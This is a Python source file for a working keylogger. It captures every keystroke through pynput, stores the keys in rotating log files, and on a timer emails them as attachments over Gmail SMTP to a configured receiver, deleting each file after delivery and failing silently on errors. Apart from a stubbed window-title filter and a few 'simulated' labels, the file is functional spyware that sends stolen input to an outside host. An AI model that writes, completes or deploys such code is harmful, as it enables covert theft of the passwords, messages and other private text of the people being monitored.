import os
import time
import threading
import smtplib
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# ==============================================================================
# 1. CONFIGURATION
#    NOTE: Replace placeholders with your actual, secured details.
# ==============================================================================

# --- Email Settings ---
SENDER_EMAIL = "your_sending_email@gmail.com"  # The account sending the logs
RECEIVER_EMAIL = "your_receiving_email@example.com" # The destination account
SENDER_PASSWORD = "your_app_password_here"     # Use an App Password (no spaces)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
DELIVERY_INTERVAL_SECONDS = 120 # Log delivery frequency (2 minutes)

# --- Log Settings ---
LOG_LIMIT = 50  # Keystrokes per log file before rotation
LOG_DIRECTORY = "simulated_logs_advanced"
LOG_FILE_PREFIX = "captured_keys"
# Only log if this string is found in the active window title (e.g., "Notepad - MyNotes.txt")
TARGET_WINDOW_TITLE = "Notepad - MyNotes.txt" 

# ==============================================================================
# 2. GLOBAL STATE
# ==============================================================================

log_count = 0
file_index = 0
current_filepath = ""

# ==============================================================================
# 3. CORE LOGIC FUNCTIONS
# ==============================================================================

def get_active_window_title():
    """
    Simulates retrieving the active window title for context filtering.
    
    In a live system (e.g., Windows), this function would use 'pywin32'
    to get the actual foreground window title at runtime.
    """
    # Returns the target title to simulate focus on the intended application
    return TARGET_WINDOW_TITLE

def initialize_environment():
    """
    Sets up the log directory and determines the starting file index for persistence.
    If logs exist, it continues indexing to prevent overwriting old data.
    """
    global file_index, current_filepath
    
    # Create log directory if it doesn't exist
    if not os.path.exists(LOG_DIRECTORY):
        os.makedirs(LOG_DIRECTORY)
        
    # Determine the next sequential file index
    existing_logs = [f for f in os.listdir(LOG_DIRECTORY) if f.startswith(LOG_FILE_PREFIX)]
    
    if existing_logs:
        max_index = 0
        for f in existing_logs:
            try:
                # Extract the numeric index from filenames like 'captured_keys_1.txt'
                index_part = f.split('_')[-1].split('.')[0]
                max_index = max(max_index, int(index_part))
            except ValueError:
                continue 
        file_index = max_index + 1
    else:
        file_index = 1
        
    current_filepath = os.path.join(LOG_DIRECTORY, f"{LOG_FILE_PREFIX}_{file_index}.txt")

def rotate_log_file():
    """
    Increments the file index, resets the keystroke count, and sets the new filename.
    This prepares the system to start a fresh log file.
    """
    global log_count, file_index, current_filepath
    file_index += 1
    log_count = 0
    current_filepath = os.path.join(LOG_DIRECTORY, f"{LOG_FILE_PREFIX}_{file_index}.txt")

def send_email_with_attachment(filepath: str) -> bool:
    """
    Connects to the SMTP server, sends a single log file, and securely deletes
    the file from the disk upon success.
    """
    try:
        # Build the MIME message structure for email with attachment
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = f"Keylogger Log File - {os.path.basename(filepath)}"
        
        # Attach the log file (read as binary)
        part = MIMEBase('application', 'octet-stream')
        with open(filepath, 'rb') as file:
            part.set_payload(file.read())
        
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(filepath)}")
        msg.attach(part)
        
        # Connect, secure the connection with TLS, authenticate, and send
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        
        # Security measure: Delete the file after confirmed secure delivery
        os.remove(filepath)
        return True
    except Exception as e:
        # Fails silently. The file remains on disk for the next delivery attempt.
        return False

# ==============================================================================
# 4. SCHEDULER AND LISTENER
# ==============================================================================

def check_and_send_logs():
    """
    Executed periodically in a background thread. It finds completed log files
    (those not currently being written to) and attempts to deliver them.
    """
    # Find all log files that are complete and ready for delivery
    completed_logs = [
        os.path.join(LOG_DIRECTORY, f) 
        for f in os.listdir(LOG_DIRECTORY) 
        if f.startswith(LOG_FILE_PREFIX) and os.path.join(LOG_DIRECTORY, f) != current_filepath
    ]

    for log_path in completed_logs:
        send_email_with_attachment(log_path)
    
    # Set the timer for the next check, ensuring continuous background operation
    schedule_log_delivery()

def schedule_log_delivery():
    """
    Uses threading.Timer to run the log checker periodically without blocking 
    the main key listener thread.
    """
    timer = threading.Timer(DELIVERY_INTERVAL_SECONDS, check_and_send_logs)
    timer.daemon = True # Allows the main program to exit cleanly
    timer.start()


def on_press(key):
    """
    The primary callback function executed by pynput on every global key press.
    Handles key conversion, context filtering, and logging/rotation.
    """
    global log_count

    # 1. Context Filtering: Only log if the target window is active
    active_title = get_active_window_title()
    if TARGET_WINDOW_TITLE not in active_title:
        return

    char_to_log = None
    try:
        # Handle regular alphanumeric keys
        char_to_log = str(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            char_to_log = ' '
        elif key == keyboard.Key.enter:
            char_to_log = '[ENTER]\n'
        elif key == keyboard.Key.esc:
            return False # Exit condition: terminate the listener
        else:
            char_to_log = f'[{key.name}]'
            
    # 2. Logging and Rotation
    if char_to_log and log_count < LOG_LIMIT:
        try:
            # Append the character to the current log file
            with open(current_filepath, 'a') as f:
                f.write(char_to_log)
            
            # Increment count only for meaningful keypresses (not shift/ctrl/alt)
            if char_to_log not in ('[shift]', '[ctrl]', '[alt]'):
                log_count += 1

            # Check for file rotation limit
            if log_count >= LOG_LIMIT:
                rotate_log_file()
                
        except IOError:
            pass # Fail silently if file writing encounters an issue

# ==============================================================================
# 5. MAIN EXECUTION
# ==============================================================================

def main():
    """
    The entry point of the application. Initializes file system, starts the
    email scheduling thread, and launches the non-blocking keyboard listener.
    """
    # Prepare directory and file paths
    initialize_environment()
    
    # Start the log delivery scheduler in the background
    schedule_log_delivery()
    
    # Start the key listener thread. Execution halts here until 'ESC' is pressed.
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
